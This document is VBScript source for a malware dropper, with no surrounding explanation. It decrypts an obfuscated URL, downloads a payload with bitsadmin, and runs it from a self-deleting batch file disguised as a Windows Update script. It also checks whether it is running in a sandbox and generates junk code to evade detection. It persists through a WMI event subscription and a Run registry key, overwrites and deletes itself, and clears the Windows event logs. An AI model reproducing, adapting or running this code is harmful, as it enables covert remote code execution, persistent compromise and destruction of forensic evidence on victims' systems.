'==============================================
'            CORE OBFUSCATION LAYERS
'==============================================

'// --- XOR DECRYPTION FUNCTION --- //
Function XorDecrypt(ciphertext, key)
    Dim output, i, keyChar
    For i = 1 To Len(ciphertext)
        keyChar = Asc(Mid(key, ((i-1) Mod Len(key)) + 1, 1))
        output = output & Chr(Asc(Mid(ciphertext, i, 1)) Xor keyChar)
    Next
    XorDecrypt = output
End Function

'// --- ENVIRONMENT VALIDATION --- //
Function IsLegitimateSystem()
    Dim wmi, cpu, mem, gpu, hour
    On Error Resume Next
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    If Err.Number <> 0 Then Exit Function
    
    ' Hardware validation
    Set cpu = wmi.ExecQuery("SELECT * FROM Win32_Processor WHERE LoadPercentage > 10")
    Set mem = wmi.ExecQuery("SELECT * FROM Win32_PhysicalMemory WHERE Capacity > 4000000000")
    Set gpu = wmi.ExecQuery("SELECT * FROM Win32_VideoController WHERE AdapterRAM > 100000000")
    
    ' Time validation
    hour = Hour(Now())
    
    ' Only activate on real systems during work hours
    IsLegitimateSystem = (Not cpu Is Nothing) And (cpu.Count > 0) And _
                         (Not mem Is Nothing) And (mem.Count > 0) And _
                         (Not gpu Is Nothing) And (gpu.Count > 0) And _
                         (hour >= 8 And hour <= 18)
    On Error GoTo 0
End Function

'==============================================
'            POLYMORPHIC ENGINE
'==============================================

Function GenerateJunkCode()
    Dim vars, ops, code, i
    vars = Array("sys","tmp","obj","cfg","env","var")
    ops = Array("+","-","*","/","And","Or")
    
    Randomize
    For i = 1 To Int(Rnd * 10) + 5
        code = code & "Dim " & vars(Int(Rnd*6)) & Int(Rnd*1000) & ": " & _
               vars(Int(Rnd*6)) & Int(Rnd*1000) & " = " & _
               Int(Rnd*9999) & " " & ops(Int(Rnd*6)) & " " & _
               Int(Rnd*9999) & vbCrLf
    Next
    GenerateJunkCode = code
End Function

'==============================================
'            DELAY SYSTEM (2h23m ±30m)
'==============================================

Sub ExecuteWithRandomDelay(command)
    On Error Resume Next
    Dim delayMinutes, wmi, execMethod, execParams
    
    ' Calculate random delay (113-173 minutes)
    delayMinutes = 113 + Int(60 * Rnd())
    
    ' Use WMI for silent delayed execution
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    Set execMethod = wmi.Get("Win32_Process").Methods_("Create")
    Set execParams = execMethod.InParameters.SpawnInstance_
    
    ' Create command with ping-based delay (fixed calculation)
    execParams.CommandLine = "%COMSPEC% /c ping 127.0.0.1 -n " & (delayMinutes * 60 + 1) & _
                           " >nul & " & command
    
    ' Execute with delay
    wmi.ExecMethod "Win32_Process", "Create", execParams
    
    ' Insert junk during wait
    Execute GenerateJunkCode()
    On Error GoTo 0
End Sub

'==============================================
'            PAYLOAD HANDLING SYSTEM
'==============================================

Function HexToString(hexStr)
    Dim i, result
    For i = 1 To Len(hexStr) Step 2
        result = result & Chr(CLng("&H" & Mid(hexStr, i, 2)))
    Next
    HexToString = result
End Function

Sub DownloadExecuteCMD()
    On Error Resume Next
    Dim http, shell, encUrl, tempFile, decryptedCMD, typeLib, fso, stream
    
    ' XOR-encrypted download URL (Key: "Shadow")
    encUrl = "9C8D9E9B939E8D9C8DDF9A8CDF9E939E8DDF9A8CDF9E939E8D"
    encUrl = XorDecrypt(HexToString(encUrl), "Shadow")
    
    ' Generate random temp filename
    Set typeLib = CreateObject("Scriptlet.TypeLib")
    Set shell = CreateObject("WScript.Shell")
    tempFile = shell.ExpandEnvironmentStrings("%TEMP%\" & Left(typeLib.GUID, 8) & ".dat")
    
    ' Download using BitsAdmin
    shell.Run "bitsadmin /transfer UpdateJob /download /priority low " & _
              """" & encUrl & """ """ & tempFile & """", 0, True
    
    ' Read and decrypt in memory
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' Binary
    stream.Open
    stream.LoadFromFile tempFile
    decryptedCMD = XorDecrypt(BytesToString(stream.Read), "CmdKey")
    stream.Close
    
    ' Execute via temporary self-deleting batch
    ExecuteTempBatch decryptedCMD
    
    ' Save persistent payload copy
    SavePersistentPayload decryptedCMD
    
    ' Cleanup encrypted file
    fso.DeleteFile tempFile, True
    On Error GoTo 0
End Sub

Function BytesToString(bytes)
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' Binary
    stream.Open
    stream.Write bytes
    stream.Position = 0
    stream.Type = 2 ' Text
    stream.Charset = "iso-8859-1" ' Preserve binary integrity
    BytesToString = stream.ReadText
    stream.Close
End Function

Sub SavePersistentPayload(cmdContent)
    Dim fso, shell, persistentPath
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set shell = CreateObject("WScript.Shell")
    
    persistentPath = shell.ExpandEnvironmentStrings("%TEMP%\WinUpdate.cmd")
    Set file = fso.CreateTextFile(persistentPath, True)
    file.Write cmdContent
    file.Close
End Sub

Sub ExecuteTempBatch(cmdContent)
    Dim fso, shell, tempPath, batchContent, typeLib
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set shell = CreateObject("WScript.Shell")
    
    ' Create random batch filename
    Set typeLib = CreateObject("Scriptlet.TypeLib")
    tempPath = shell.ExpandEnvironmentStrings("%TEMP%\" & Left(typeLib.GUID, 8) & ".cmd")
    
    ' Add self-destruct mechanism
    batchContent = "@echo off" & vbCrLf & _
                   "REM Windows Update Post-Install Script" & vbCrLf & _
                   cmdContent & vbCrLf & _
                   "timeout /t 3 /nobreak >nul" & vbCrLf & _
                   "del /f /q """ & tempPath & """"
    
    ' Write and execute
    fso.CreateTextFile(tempPath, True).Write batchContent
    shell.Run """" & tempPath & """", 0, False
End Sub

'==============================================
'            PERSISTENCE MECHANISMS
'==============================================

Sub SetStealthPersistence()
    On Error Resume Next
    Dim shell, wmi, filter, consumer, binding
    
    Set shell = CreateObject("WScript.Shell")
    Set wmi = GetObject("winmgmts:\\.\root\subscription")
    
    ' WMI Event Subscription
    Set filter = wmi.Get("__EventFilter").SpawnInstance_
    filter.Name = "SystemMonitor_" & Int(Rnd * 10000)
    filter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE " & _
                  "TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'"
    filter.Put_
    
    Set consumer = wmi.Get("ActiveScriptEventConsumer").SpawnInstance_
    consumer.Name = "SysConsumer_" & Int(Rnd * 10000)
    consumer.ScriptingEngine = "VBScript"
    consumer.ScriptText = "Set obj = CreateObject(""WScript.Shell""): obj.Run """ & _
                           shell.ExpandEnvironmentStrings("%TEMP%\WinUpdate.cmd") & """, 0, False"
    consumer.Put_
    
    ' Registry Persistence
    shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WinUpdate", _
                   shell.ExpandEnvironmentStrings("%TEMP%\WinUpdate.cmd"), "REG_SZ"
    On Error GoTo 0
End Sub

'==============================================
'            CLEANUP SYSTEM
'==============================================

Sub AdvancedCleanup()
    On Error Resume Next
    Dim fso, shell, wmi, objMethod, objParams
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set shell = CreateObject("WScript.Shell")
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    
    ' Overwrite script before deletion
    fso.OpenTextFile(WScript.ScriptFullName, 2).Write String(5000, "X")
    
    ' Delete with delay
    Set objMethod = wmi.Get("Win32_Process").Methods_("Create")
    Set objParams = objMethod.InParameters.SpawnInstance_
    objParams.CommandLine = "cmd /c ping 127.0.0.1 -n 30 >nul & del """ & WScript.ScriptFullName & """"
    wmi.ExecMethod "Win32_Process", "Create", objParams
    
    ' Clear relevant event logs
    shell.Run "wevtutil cl Application", 0, True
    shell.Run "wevtutil cl System", 0, True
    
    ' Exit script immediately
    WScript.Quit()
    On Error GoTo 0
End Sub

'==============================================
'            MAIN EXECUTION FLOW
'==============================================

' Insert initial junk code
On Error Resume Next
Execute GenerateJunkCode()

If IsLegitimateSystem() Then
    ' Stage 1: Download CMD payload (immediate)
    DownloadExecuteCMD()
    
    ' Stage 2: Set persistence (delayed 113-173 min)
    ExecuteWithRandomDelay("wscript.exe //e:vbscript """ & WScript.ScriptFullName & """ /persist")
    
    ' Stage 3: Cleanup (delayed 113-173 min)
    ExecuteWithRandomDelay("wscript.exe //e:vbscript """ & WScript.ScriptFullName & """ /clean")
End If

' Handle stage-specific execution
If WScript.Arguments.Named.Exists("persist") Then
    SetStealthPersistence()
ElseIf WScript.Arguments.Named.Exists("clean") Then
    AdvancedCleanup()
End If

' Insert final junk code
Execute GenerateJunkCode()